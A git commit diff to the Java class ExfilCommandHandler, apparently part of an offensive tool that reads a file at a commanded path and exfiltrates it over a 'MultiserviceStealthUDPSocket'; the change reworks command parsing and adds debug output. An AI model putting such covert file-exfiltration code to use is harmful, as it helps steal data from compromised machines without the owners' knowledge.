80213ae5ee3efbda288ce262d69566f8fbeb0731
Zaine Wilson <zgwwilson@gmail.com>
2019-04-22 00:26:35 -0400

    New shit just got made!

--- src/exfilfunctions/ExfilCommandHandler.java
+++ src/exfilfunctions/ExfilCommandHandler.java
@@ -23,9 +23,16 @@ public class ExfilCommandHandler {
 	public String handleExfil(String command, MultiserviceStealthUDPSocket msus) {
 		try{
 			System.out.println("[+] Exfil Begins");
-			String[] commandParts = command.split(" ");
-			String path = commandParts[1];
-			int waitTime = Integer.parseInt(commandParts[2]);
+			System.out.println("[d] Proceessing Command: "+command);
+			command=command.substring(0,command.length()-command.length()%3);
+			String path = command.split("\"")[1];
+			int waitTime = Integer.parseInt(command.substring(command.lastIndexOf('\"')+2));
+			System.out.println("[d] Determined Path: ");
+			System.out.println(path);
+			System.out.println("[d] Wait time (ms): "+waitTime );
+			//String[] commandParts = command.split(" ");
+			//String path = commandParts[1];
+			//int waitTime = Integer.parseInt(commandParts[2]);
 			FileInputStream fis = new FileInputStream(new File(path));
 			int c;
 			ArrayList<Byte> exfilBytes = new ArrayList<Byte>();
@@ -41,6 +48,7 @@ public class ExfilCommandHandler {
 			return "Exfil Success!";
 			
 		}catch(Exception e){
+			e.printStackTrace();
 			return "Exfil Failed! \n"+e.toString();
 		}
 		
